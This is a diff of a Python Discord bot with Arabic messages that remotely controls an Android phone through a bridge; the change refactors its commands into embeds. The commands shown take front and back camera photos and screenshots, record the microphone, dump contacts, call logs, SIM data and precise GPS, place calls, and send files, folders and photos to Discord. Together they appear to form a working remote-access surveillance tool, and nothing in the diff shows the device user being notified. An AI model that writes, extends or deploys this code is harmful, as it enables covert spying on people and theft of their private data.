-        f"🔎 **{len(results)}** نتيجة لـ `{name}`"
-        + (" (Regex)" if regex else ""),
-        view=view
+    embed = _make_embed(
+        f"🔎 {len(results)} نتيجة",
+        f"**البحث:** `{name}`" + (" (Regex)" if regex else ""),
+        Colors.FILES,
     )
+    await interaction.followup.send(embed=embed, view=view)
 
 
-@bot.tree.command(name="find", description="🔍 بحث سريع")
+@bot_command("find", "🔍 بحث سريع")
 @app_commands.describe(name="جزء من الاسم", limit="الحد (1-20)")
 @require_allowed
 @with_stats("find")
@@ -1647,17 +2261,21 @@ async def find_cmd(interaction: discord.Interaction, name: str,
                                      max_results=limit, max_depth=6)
     except Exception as e:
         STATS.record_error("find")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
     if not results:
-        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
+        await _safe_reply(interaction, f"لا نتائج لـ `{name}`.")
         return
     view = FindResultsView(results, name)
-    await interaction.followup.send(
-        f"🔍 **{len(results)}** نتيجة لـ `{name}`:", view=view)
+    embed = _make_embed(
+        f"🔍 {len(results)} نتيجة",
+        f"**البحث:** `{name}`",
+        Colors.FILES,
+    )
+    await interaction.followup.send(embed=embed, view=view)
 
 
-@bot.tree.command(name="get", description="📄 سحب ملف")
+@bot_command("get", "📄 سحب ملف")
 @app_commands.describe(path="المسار")
 @require_allowed
 @with_stats("get")
@@ -1666,7 +2284,7 @@ async def get_cmd(interaction: discord.Interaction, path: str):
     await _send_any_file(interaction, path)
 
 
-@bot.tree.command(name="zip", description="🗜️ ضغط مجلد")
+@bot_command("zip", "🗜️ ضغط مجلد")
 @app_commands.describe(path="المسار")
 @require_allowed
 @with_stats("zip")
@@ -1675,7 +2293,7 @@ async def zip_cmd(interaction: discord.Interaction, path: str):
     await _send_zip_of_dir(interaction, path)
 
 
-@bot.tree.command(name="latest", description="🆕 آخر الصور")
+@bot_command("latest", "🆕 آخر الصور")
 @app_commands.describe(folder="المجلد", count="العدد (1-10)")
 @require_allowed
 @with_stats("latest")
@@ -1687,7 +2305,7 @@ async def latest_cmd(interaction: discord.Interaction, folder: str = None,
     await interaction.response.defer()
     try:
         if not is_path_allowed(folder) or not os.path.isdir(folder):
-            await interaction.followup.send("❌ مجلد غير صالح.")
+            await _safe_reply(interaction, "❌ مجلد غير صالح.")
             return
         files = [os.path.join(folder, f)
                  for f in os.listdir(folder)
@@ -1696,7 +2314,7 @@ async def latest_cmd(interaction: discord.Interaction, folder: str = None,
         files.sort(key=os.path.getmtime, reverse=True)
         files = files[:count]
         if not files:
-            await interaction.followup.send("لا توجد صور.")
+            await _safe_reply(interaction, "لا توجد صور.")
             return
         for fp in files:
             compressed = await _compress_image(fp)
@@ -1715,10 +2333,10 @@ async def latest_cmd(interaction: discord.Interaction, folder: str = None,
                     except Exception:
                         pass
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
 
 
-@bot.tree.command(name="pull_camera", description="📤 اسحب آخر n صورة")
+@bot_command("pull_camera", "📤 اسحب آخر n صورة")
 @app_commands.describe(n="العدد (1-20)")
 @require_allowed
 @with_stats("pull_camera")
@@ -1726,12 +2344,12 @@ async def pull_camera_cmd(interaction: discord.Interaction, n: int = 5):
     await interaction.response.defer()
     path = _find_dir_in_roots(CAMERA_PATHS)
     if not path:
-        await interaction.followup.send("❌ لم أجد مجلد الكاميرا.")
+        await _safe_reply(interaction, "❌ لم أجد مجلد الكاميرا.")
         return
     await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))
 
 
-@bot.tree.command(name="pull_screens", description="📤 اسحب آخر n لقطة")
+@bot_command("pull_screens", "📤 اسحب آخر n لقطة")
 @app_commands.describe(n="العدد (1-20)")
 @require_allowed
 @with_stats("pull_screens")
@@ -1739,38 +2357,38 @@ async def pull_screens_cmd(interaction: discord.Interaction, n: int = 5):
     await interaction.response.defer()
     path = _find_dir_in_roots(SCREENSHOT_PATHS)
     if not path:
-        await interaction.followup.send("❌ لم أجد مجلد اللقطات.")
+        await _safe_reply(interaction, "❌ لم أجد مجلد اللقطات.")
         return
     await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))
 
 
-@bot.tree.command(name="resume", description="▶️ استئناف السحب")
+@bot_command("resume", "▶️ استئناف السحب")
 @require_allowed
 @with_stats("resume")
 async def resume_cmd(interaction: discord.Interaction):
     d = bulk_state.get('resume_dir')
     i = bulk_state.get('resume_index', 0)
     if not d:
-        await interaction.response.send_message(
-            "لا يوجد سحب موقوف.", ephemeral=True)
+        await _safe_reply(interaction, "لا يوجد سحب موقوف.", ephemeral=True)
         return
     await interaction.response.defer()
     bulk_state['suspended'] = False
     await _send_images_bulk(interaction, d, start_index=i)
 
 
-@bot.tree.command(name="stop", description="⏹️ أوقف السحب")
+@bot_command("stop_bulk", "⏹️ أوقف السحب الجماعي")
 @require_allowed
-@with_stats("stop")
-async def stop_cmd(interaction: discord.Interaction):
+@with_stats("stop_bulk")
+async def stop_bulk_cmd(interaction: discord.Interaction):
     bulk_state['suspended'] = True
-    await interaction.response.send_message("⛔ سيتم الإيقاف قريبًا.")
+    await _safe_reply(interaction, "⛔ سيتم الإيقاف قريبًا.",
+                      ephemeral=True)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Media Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="screenshot", description="📸 لقطة شاشة")
+@bot_command("screenshot", "📸 لقطة شاشة")
 @app_commands.describe(send="أرسلها لديسكورد؟")
 @require_allowed
 @require_bridge
@@ -1782,10 +2400,11 @@ async def screenshot_cmd(interaction: discord.Interaction,
         path = await asyncio.to_thread(_bridge.capture_screen)
     except Exception as e:
         STATS.record_error("screenshot")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
     if not path or not os.path.isfile(path):
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ فشل التقاط الشاشة.\n"
             "**ملاحظة:** في Android 11+، التقاط الشاشة الحقيقي "
             "يحتاج MediaProjection."
@@ -1793,81 +2412,95 @@ async def screenshot_cmd(interaction: discord.Interaction,
         return
     size_mb = os.path.getsize(path) / (1024 * 1024)
     if size_mb > DISCORD_LIMIT_MB:
-        await interaction.followup.send(f"⚠️ {size_mb:.1f}MB > الحد")
+        await _safe_reply(interaction, f"⚠️ {size_mb:.1f}MB > الحد")
         return
     if send:
         try:
             await interaction.followup.send(
-                content=f"📸 لقطة — `{os.path.basename(path)}`",
+                embed=_make_embed(
+                    "📸 لقطة شاشة",
+                    f"`{os.path.basename(path)}`",
+                    Colors.MEDIA,
+                ),
                 file=discord.File(path)
             )
             STATS.record_file(os.path.getsize(path))
         except Exception as e:
-            await interaction.followup.send(f"خطأ: {e}")
+            await _safe_reply(interaction, f"خطأ: {e}")
     else:
-        await interaction.followup.send(f"📸 حُفظت في `{path}`")
+        await _safe_reply(interaction, f"📸 حُفظت في `{path}`")
 
 
-@bot.tree.command(name="snap_back", description="📷 صورة بالكاميرا الخلفية")
+@bot_command("snap_back", "📷 صورة بالكاميرا الخلفية")
 @require_allowed
 @require_bridge
+@with_cloud_audit("snap_back")
 @with_stats("snap_back")
 async def snap_back_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
     path = await asyncio.to_thread(_bridge.capture_camera, 0)
     if not path or not os.path.isfile(path):
-        await interaction.followup.send(
-            "❌ فشل التصوير.\n"
-            "تأكد من منح صلاحية الكاميرا."
+        await _safe_reply(
+            interaction,
+            "❌ فشل التصوير.\nتأكد من منح صلاحية الكاميرا."
         )
         return
     try:
         await interaction.followup.send(
-            content=f"📷 كاميرا خلفية — `{os.path.basename(path)}`",
+            embed=_make_embed(
+                "📷 كاميرا خلفية",
+                f"`{os.path.basename(path)}`",
+                Colors.MEDIA,
+            ),
             file=discord.File(path)
         )
         STATS.record_file(os.path.getsize(path))
     except Exception as e:
-        await interaction.followup.send(f"خطأ: {e}\n`{path}`")
+        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")
 
 
-@bot.tree.command(name="snap_front", description="🤳 صورة بالكاميرا الأمامية")
+@bot_command("snap_front", "🤳 صورة بالكاميرا الأمامية")
 @require_allowed
 @require_bridge
+@with_cloud_audit("snap_front")
 @with_stats("snap_front")
 async def snap_front_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
     path = await asyncio.to_thread(_bridge.capture_camera, 1)
     if not path or not os.path.isfile(path):
-        await interaction.followup.send(
-            "❌ فشل التصوير.\n"
-            "تأكد من منح صلاحية الكاميرا."
+        await _safe_reply(
+            interaction,
+            "❌ فشل التصوير.\nتأكد من منح صلاحية الكاميرا."
         )
         return
     try:
         await interaction.followup.send(
-            content=f"🤳 كاميرا أمامية — `{os.path.basename(path)}`",
+            embed=_make_embed(
+                "🤳 كاميرا أمامية",
+                f"`{os.path.basename(path)}`",
+                Colors.MEDIA,
+            ),
             file=discord.File(path)
         )
         STATS.record_file(os.path.getsize(path))
     except Exception as e:
-        await interaction.followup.send(f"خطأ: {e}\n`{path}`")
+        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")
 
 
-@bot.tree.command(name="camera_app", description="📷 افتح تطبيق الكاميرا")
+@bot_command("camera_app", "📷 افتح تطبيق الكاميرا")
 @require_allowed
 @require_bridge
 @with_stats("camera_app")
 async def camera_app_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
     result = await asyncio.to_thread(_bridge.open_camera_app)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Contacts Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="contacts", description="👥 جهات الاتصال")
+@bot_command("contacts", "👥 جهات الاتصال")
 @app_commands.describe(search="بحث")
 @require_allowed
 @require_bridge
@@ -1880,29 +2513,35 @@ async def contacts_cmd(interaction: discord.Interaction, search: str = None):
     except Exception:
         arr = []
     if not arr:
-        await interaction.followup.send("👥 لا توجد جهات اتصال.")
+        await _safe_reply(interaction, "👥 لا توجد جهات اتصال.")
         return
-    lines = [f"👥 **{len(arr)} جهة**"
-             + (f" (بحث: `{search}`)" if search else "") + ":\n"]
+
+    lines = []
     for c in arr[:30]:
         lines.append(
             f"• **{c.get('name', '?')}** — `{c.get('number', '?')}`")
     if len(arr) > 30:
         lines.append(f"\n... و {len(arr)-30} أخرى")
-    await interaction.followup.send("\n".join(lines)[:1900])
+
+    embed = _make_embed(
+        f"👥 {len(arr)} جهة اتصال",
+        "\n".join(lines)[:1900],
+        Colors.CONTACTS,
+    )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="wa_home", description="💬 واتساب الرئيسية")
+@bot_command("wa_home", "💬 واتساب الرئيسية")
 @require_allowed
 @require_bridge
 @with_stats("wa_home")
 async def wa_home_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
     result = await asyncio.to_thread(_bridge.open_whatsapp_home)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="wa", description="💬 فتح محادثة واتساب")
+@bot_command("wa", "💬 فتح محادثة واتساب")
 @app_commands.describe(phone="الرقم", text="نص جاهز")
 @require_allowed
 @require_bridge
@@ -1912,10 +2551,10 @@ async def wa_cmd(interaction: discord.Interaction, phone: str = None,
     await interaction.response.defer()
     result = await asyncio.to_thread(
         _bridge.open_whatsapp_chat, phone or "", text or "")
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="dial", description="📞 لوحة الاتصال")
+@bot_command("dial", "📞 لوحة الاتصال")
 @app_commands.describe(phone="الرقم")
 @require_allowed
 @require_bridge
@@ -1923,13 +2562,13 @@ async def wa_cmd(interaction: discord.Interaction, phone: str = None,
 async def dial_cmd(interaction: discord.Interaction, phone: str):
     await interaction.response.defer()
     result = await asyncio.to_thread(_bridge.dial, phone)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Phone Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="calllog", description="📞 سجل المكالمات")
+@bot_command("calllog", "📞 سجل المكالمات")
 @app_commands.describe(
     limit="العدد (1-100)",
     type_filter="all | incoming | outgoing | missed",
@@ -1952,18 +2591,19 @@ async def calllog_cmd(interaction: discord.Interaction,
         entries = json.loads(data) if data else []
     except Exception as e:
         STATS.record_error("calllog")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if isinstance(entries, dict) and entries.get("status") == "permission_denied":
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **صلاحية سجل المكالمات غير ممنوحة**\n\n"
             "افتح التطبيق → الأذونات → فعّل **سجل المكالمات**"
         )
         return
 
     if not entries:
-        await interaction.followup.send("📞 لا توجد مكالمات مطابقة.")
+        await _safe_reply(interaction, "📞 لا توجد مكالمات مطابقة.")
         return
 
     type_icons = {
@@ -1971,21 +2611,14 @@ async def calllog_cmd(interaction: discord.Interaction,
         "rejected": "🚫", "blocked": "⛔", "voicemail": "📧",
     }
 
-    lines = [f"📞 **{len(entries)} مكالمة:**\n"]
+    lines = []
     for c in entries[:25]:
         icon = type_icons.get(c.get("type", "unknown"), "📱")
         name = c.get("name", "غير معروف")
         number = c.get("number", "?")
-        date = c.get("date_str", "")
         duration = c.get("duration_str", "0s")
         is_new = "🆕 " if c.get("is_new") else ""
-        lines.append(
-            f"{is_new}{icon} **{name}**\n"
-            f"   `{number}` · {duration}\n"
-            f"   ⏰ {date}\n"
-        )
-    if len(entries) > 25:
-        lines.append(f"... و {len(entries)-25} أخرى")
+        lines.append(f"{is_new}{icon} **{name}** · `{number}` · {duration}")
 
     text = "\n".join(lines)
     if len(text) > 1900:
@@ -2002,10 +2635,15 @@ async def calllog_cmd(interaction: discord.Interaction,
             except Exception:
                 pass
     else:
-        await interaction.followup.send(text)
+        embed = _make_embed(
+            f"📞 {len(entries)} مكالمة",
+            text,
+            Colors.PHONE,
+        )
+        await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="call", description="☎️ إجراء مكالمة مباشرة")
+@bot_command("call", "☎️ إجراء مكالمة مباشرة")
 @app_commands.describe(phone="رقم الهاتف")
 @require_allowed
 @require_bridge
@@ -2014,17 +2652,18 @@ async def call_cmd(interaction: discord.Interaction, phone: str):
     await interaction.response.defer()
 
     if not _bridge.has_call_permission():
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **صلاحية إجراء المكالمات غير ممنوحة**\n\n"
             "افتح التطبيق → الأذونات → فعّل **الهاتف**"
         )
         return
 
     result = await asyncio.to_thread(_bridge.call_number, phone)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="phoneinfo", description="📱 معلومات الهاتف والشبكة")
+@bot_command("phoneinfo", "📱 معلومات الهاتف والشبكة")
 @require_allowed
 @require_bridge
 @with_stats("phoneinfo")
@@ -2036,50 +2675,58 @@ async def phoneinfo_cmd(interaction: discord.Interaction):
         info = json.loads(data) if data else {}
     except Exception as e:
         STATS.record_error("phoneinfo")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if info.get("status") == "permission_denied":
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **صلاحية معلومات الهاتف غير ممنوحة**\n\n"
             "افتح التطبيق → الأذونات → فعّل **الهاتف**"
         )
         return
 
-    lines = ["📱 **معلومات الهاتف:**\n"]
+    embed = _make_embed("📱 معلومات الهاتف", color=Colors.PHONE)
     if info.get("network_operator"):
-        lines.append(f"📡 **الشبكة:** `{info['network_operator']}`")
-    if info.get("network_operator_code"):
-        lines.append(f"   الكود: `{info['network_operator_code']}`")
+        embed.add_field(
+            name="📡 الشبكة",
+            value=(f"• المشغل: `{info['network_operator']}`\n"
+                   f"• الكود: `{info.get('network_operator_code', '?')}`\n"
+                   f"• النوع: `{info.get('network_type', '?')}`\n"
+                   f"• البلد: `{info.get('network_country', '?')}`"),
+            inline=True,
+        )
     if info.get("sim_operator"):
-        lines.append(f"💳 **SIM:** `{info['sim_operator']}`")
-    if info.get("sim_operator_code"):
-        lines.append(f"   الكود: `{info['sim_operator_code']}`")
-    if info.get("sim_country"):
-        lines.append(f"🌍 **بلد SIM:** `{info['sim_country']}`")
-    if info.get("network_country"):
-        lines.append(f"🌍 **بلد الشبكة:** `{info['network_country']}`")
+        embed.add_field(
+            name="💳 SIM",
+            value=(f"• المشغل: `{info['sim_operator']}`\n"
+                   f"• الكود: `{info.get('sim_operator_code', '?')}`\n"
+                   f"• الحالة: `{info.get('sim_state', '?')}`\n"
+                   f"• البلد: `{info.get('sim_country', '?')}`"),
+            inline=True,
+        )
     if info.get("phone_number"):
-        lines.append(f"📞 **رقم الهاتف:** `{info['phone_number']}`")
-    if info.get("sim_state"):
-        lines.append(f"💠 **حالة SIM:** `{info['sim_state']}`")
-    if info.get("phone_type"):
-        lines.append(f"📶 **نوع الهاتف:** `{info['phone_type']}`")
-    if info.get("network_type"):
-        lines.append(f"🌐 **نوع الشبكة:** `{info['network_type']}`")
+        embed.add_field(
+            name="📞 رقم الهاتف",
+            value=f"`{info['phone_number']}`",
+            inline=False,
+        )
     if "is_roaming" in info:
-        roam = "✅ نعم" if info["is_roaming"] else "❌ لا"
-        lines.append(f"✈️ **التجوال:** {roam}")
-
-    await interaction.followup.send("\n".join(lines))
+        embed.add_field(
+            name="✈️ التجوال",
+            value="✅ نعم" if info["is_roaming"] else "❌ لا",
+            inline=True,
+        )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Location Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="gps", description="📍 الموقع الجغرافي الدقيق")
+@bot_command("gps", "📍 الموقع الجغرافي الدقيق")
 @require_allowed
 @require_bridge
+@with_cloud_audit("gps")
 @with_stats("gps")
 async def gps_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
@@ -2089,25 +2736,27 @@ async def gps_cmd(interaction: discord.Interaction):
         loc = json.loads(data) if data else {}
     except Exception as e:
         STATS.record_error("gps")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if loc.get("status") == "permission_denied":
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **صلاحية الموقع غير ممنوحة**\n\n"
             "افتح التطبيق → الأذونات → فعّل **الموقع**"
         )
         return
 
     if loc.get("status") == "no_location":
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **لا يوجد موقع معروف**\n"
             "فعّل GPS ثم افتح خرائط Google مرة واحدة."
         )
         return
 
     if not loc.get("latitude"):
-        await interaction.followup.send("❌ لم أتمكن من قراءة الموقع.")
+        await _safe_reply(interaction, "❌ لم أتمكن من قراءة الموقع.")
         return
 
     lat = loc.get("latitude")
@@ -2129,21 +2778,36 @@ async def gps_cmd(interaction: discord.Interaction):
         if loc.get("is_stale"):
             age_str += " ⚠️ قديم"
 
-    await interaction.followup.send(
-        f"📍 **الموقع الحالي:**\n\n"
-        f"🌐 **الإحداثيات:**\n"
-        f"   Latitude: `{lat}`\n"
-        f"   Longitude: `{lon}`\n\n"
-        f"🎯 **الدقة:** `{acc:.1f}m`\n"
-        f"⛰️ **الارتفاع:** `{alt:.1f}m`\n"
-        f"📡 **المصدر:** `{provider}`\n"
-        + (f"⏰ {age_str}\n" if age_str else "") +
-        f"\n🗺️ [افتح في خرائط Google]({maps})"
+    embed = _make_embed("📍 الموقع الحالي", color=Colors.LOCATION)
+    embed.add_field(
+        name="🌐 الإحداثيات",
+        value=f"`{lat}`\n`{lon}`",
+        inline=True,
     )
+    embed.add_field(
+        name="🎯 الدقة",
+        value=f"`{acc:.1f}m`",
+        inline=True,
+    )
+    embed.add_field(
+        name="📡 المصدر",
+        value=f"`{provider}`",
+        inline=True,
+    )
+    if age_str:
+        embed.add_field(name="⏰ العمر", value=age_str, inline=True)
+    if alt:
+        embed.add_field(name="⛰️ الارتفاع",
+                        value=f"`{alt:.1f}m`", inline=True)
+    embed.add_field(
+        name="🗺️ الخريطة",
+        value=f"[افتح في خرائط Google]({maps})",
+        inline=False,
+    )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="gps_providers",
-                   description="📡 حالة مزوّدي خدمة الموقع")
+@bot_command("gps_providers", "📡 حالة مزوّدي الموقع")
 @require_allowed
 @require_bridge
 @with_stats("gps_providers")
@@ -2154,35 +2818,40 @@ async def gps_providers_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.get_location_providers)
         providers = json.loads(data) if data else {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if not providers:
-        await interaction.followup.send("❌ لم أتمكن من قراءة المزوّدين.")
+        await _safe_reply(interaction, "❌ لم أتمكن من قراءة المزوّدين.")
         return
 
     def m(b):
         return "✅" if b else "❌"
 
-    lines = [
-        "📡 **حالة مزوّدي الموقع:**\n",
-        f"{m(providers.get('gps'))} 🛰️ GPS",
-        f"{m(providers.get('network'))} 🌐 Network",
-        f"{m(providers.get('passive'))} 📶 Passive",
-    ]
+    embed = _make_embed("📡 مزوّدو الموقع", color=Colors.LOCATION)
+    embed.add_field(
+        name="الحالة",
+        value=(f"{m(providers.get('gps'))} 🛰️ GPS\n"
+               f"{m(providers.get('network'))} 🌐 Network\n"
+               f"{m(providers.get('passive'))} 📶 Passive"),
+        inline=True,
+    )
     if "location_enabled" in providers:
-        lines.append(
-            f"{m(providers['location_enabled'])} 🔓 خدمة الموقع العامة"
+        embed.add_field(
+            name="🔓 خدمة الموقع",
+            value=m(providers['location_enabled']),
+            inline=True,
         )
     if providers.get("all_providers"):
-        lines.append(
-            f"\n**المتوفرة:** "
-            + ", ".join(f"`{p}`" for p in providers["all_providers"])
+        embed.add_field(
+            name="المتوفرة",
+            value=", ".join(f"`{p}`" for p in providers["all_providers"]),
+            inline=False,
         )
-    await interaction.followup.send("\n".join(lines))
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="ip", description="🌐 عنوان IP العام")
+@bot_command("ip", "🌐 عنوان IP العام")
 @require_allowed
 @with_stats("ip")
 async def ip_cmd(interaction: discord.Interaction):
@@ -2190,26 +2859,29 @@ async def ip_cmd(interaction: discord.Interaction):
     try:
         import requests
         r = requests.get("https://api.ipify.org?format=json", timeout=10)
-        await interaction.followup.send(f"🌐 IP: `{r.json().get('ip')}`")
+        embed = _make_embed("🌐 IP العام",
+                            f"`{r.json().get('ip')}`", Colors.INFO)
+        await interaction.followup.send(embed=embed)
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Audio Commands (v4.0)
+#                       Audio Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="record",
-                   description="🎤 بدء تسجيل صوتي من الميكروفون")
+@bot_command("record", "🎤 بدء تسجيل صوتي")
 @app_commands.describe(duration="المدة بالثواني (1-600)")
 @require_allowed
 @require_bridge
+@with_cloud_audit("record")
 @with_stats("record")
 async def record_cmd(interaction: discord.Interaction, duration: int = 10):
     duration = max(1, min(600, duration))
     await interaction.response.defer()
 
     if _bridge.is_audio_recording():
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "⚠️ يوجد تسجيل جارٍ بالفعل.\n"
             "استخدم `/record_stop` لإيقافه."
         )
@@ -2217,11 +2889,10 @@ async def record_cmd(interaction: discord.Interaction, duration: int = 10):
 
     result = await asyncio.to_thread(
         _bridge.start_audio_recording, duration)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="record_stop",
-                   description="⏹️ إيقاف التسجيل وإرساله")
+@bot_command("record_stop", "⏹️ إيقاف التسجيل وإرساله")
 @require_allowed
 @require_bridge
 @with_stats("record_stop")
@@ -2229,33 +2900,37 @@ async def record_stop_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
 
     if not _bridge.is_audio_recording():
-        await interaction.followup.send("⚠️ لا يوجد تسجيل جارٍ.")
+        await _safe_reply(interaction, "⚠️ لا يوجد تسجيل جارٍ.")
         return
 
     path = await asyncio.to_thread(_bridge.stop_audio_recording)
     if not path or not os.path.isfile(path):
-        await interaction.followup.send("❌ لم يتم العثور على ملف التسجيل.")
+        await _safe_reply(interaction, "❌ لم يتم العثور على ملف التسجيل.")
         return
 
     size_mb = os.path.getsize(path) / (1024 * 1024)
     if size_mb > DISCORD_LIMIT_MB:
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             f"⚠️ الحجم {size_mb:.1f}MB > الحد\n`{path}`"
         )
         return
 
     try:
         await interaction.followup.send(
-            content=f"🎤 تسجيل صوتي — `{os.path.basename(path)}`",
+            embed=_make_embed(
+                "🎤 تسجيل صوتي",
+                f"`{os.path.basename(path)}`",
+                Colors.AUDIO,
+            ),
             file=discord.File(path)
         )
         STATS.record_file(os.path.getsize(path))
     except Exception as e:
-        await interaction.followup.send(f"خطأ: {e}\n`{path}`")
+        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")
 
 
-@bot.tree.command(name="record_status",
-                   description="📊 حالة التسجيل الحالي")
+@bot_command("record_status", "📊 حالة التسجيل الحالي")
 @require_allowed
 @require_bridge
 @with_stats("record_status")
@@ -2264,7 +2939,7 @@ async def record_status_cmd(interaction: discord.Interaction):
 
     is_rec = _bridge.is_audio_recording()
     if not is_rec:
-        await interaction.followup.send("⏹️ لا يوجد تسجيل جارٍ.")
+        await _safe_reply(interaction, "⏹️ لا يوجد تسجيل جارٍ.")
         return
 
     dur = _bridge.get_recording_duration()
@@ -2273,16 +2948,18 @@ async def record_status_cmd(interaction: discord.Interaction):
     fmt = _bridge.get_audio_format() if hasattr(_bridge, "get_audio_format") \
           else "?"
 
-    await interaction.followup.send(
-        f"🎤 **التسجيل الجاري**\n"
+    embed = _make_embed(
+        "🎤 التسجيل الجاري",
         f"📊 الحالة: `{state}`\n"
         f"⏱️ المدة: `{dur}s`\n"
-        f"🎵 الصيغة: `{fmt}`\n"
-        f"استخدم `/record_stop` للإيقاف."
+        f"🎵 الصيغة: `{fmt}`\n\n"
+        f"استخدم `/record_stop` للإيقاف.",
+        Colors.AUDIO,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="record_pause", description="⏸️ إيقاف مؤقت للتسجيل")
+@bot_command("record_pause", "⏸️ إيقاف مؤقت للتسجيل")
 @require_allowed
 @require_bridge
 @require_android_min(24)
@@ -2296,10 +2973,10 @@ async def record_pause_cmd(interaction: discord.Interaction):
             result = "❌ pause_audio_recording غير متوفرة في bridge"
     except Exception as e:
         result = f"❌ {e}"
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="record_resume", description="▶️ استئناف التسجيل")
+@bot_command("record_resume", "▶️ استئناف التسجيل")
 @require_allowed
 @require_bridge
 @require_android_min(24)
@@ -2313,11 +2990,10 @@ async def record_resume_cmd(interaction: discord.Interaction):
             result = "❌ resume_audio_recording غير متوفرة في bridge"
     except Exception as e:
         result = f"❌ {e}"
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="record_history",
-                   description="📜 آخر 10 تسجيلات")
+@bot_command("record_history", "📜 آخر 10 تسجيلات")
 @require_allowed
 @require_bridge
 @with_stats("record_history")
@@ -2333,10 +3009,10 @@ async def record_history_cmd(interaction: discord.Interaction):
         history = []
 
     if not history:
-        await interaction.followup.send("📜 لا يوجد سجل تسجيلات.")
+        await _safe_reply(interaction, "📜 لا يوجد سجل تسجيلات.")
         return
 
-    lines = [f"📜 **آخر {len(history)} تسجيل:**\n"]
+    lines = []
     for i, p in enumerate(history, 1):
         name = os.path.basename(p)
         size = ""
@@ -2347,11 +3023,15 @@ async def record_history_cmd(interaction: discord.Interaction):
             pass
         lines.append(f"`{i}.` `{name}`" + (f" — {size}" if size else ""))
 
-    await interaction.followup.send("\n".join(lines)[:1900])
+    embed = _make_embed(
+        f"📜 آخر {len(history)} تسجيل",
+        "\n".join(lines)[:1900],
+        Colors.AUDIO,
+    )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="record_stats",
-                   description="📊 إحصائيات التسجيلات")
+@bot_command("record_stats", "📊 إحصائيات التسجيلات")
 @require_allowed
 @require_bridge
 @with_stats("record_stats")
@@ -2376,16 +3056,18 @@ async def record_stats_cmd(interaction: discord.Interaction):
         if s < 3600: return f"{s//60}m {s%60}s"
         return f"{s//3600}h {(s%3600)//60}m"
 
-    await interaction.followup.send(
-        f"📊 **إحصائيات التسجيلات:**\n\n"
+    embed = _make_embed(
+        "📊 إحصائيات التسجيلات",
         f"🎤 **إجمالي التسجيلات:** `{total}`\n"
         f"⏱️ **إجمالي المدة:** `{fmt_dur(dur)}`\n"
-        f"🔴 **جارٍ الآن:** {'✅ نعم — ' + str(cur_dur) + 's' if is_rec else '❌ لا'}"
+        f"🔴 **جارٍ الآن:** "
+        f"{'✅ نعم — ' + str(cur_dur) + 's' if is_rec else '❌ لا'}",
+        Colors.AUDIO,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="record_cleanup",
-                   description="🗑️ حذف التسجيلات القديمة")
+@bot_command("record_cleanup", "🗑️ حذف التسجيلات القديمة")
 @app_commands.describe(keep="عدد التسجيلات الأخيرة للإبقاء")
 @require_allowed
 @require_bridge
@@ -2400,18 +3082,19 @@ async def record_cleanup_cmd(interaction: discord.Interaction,
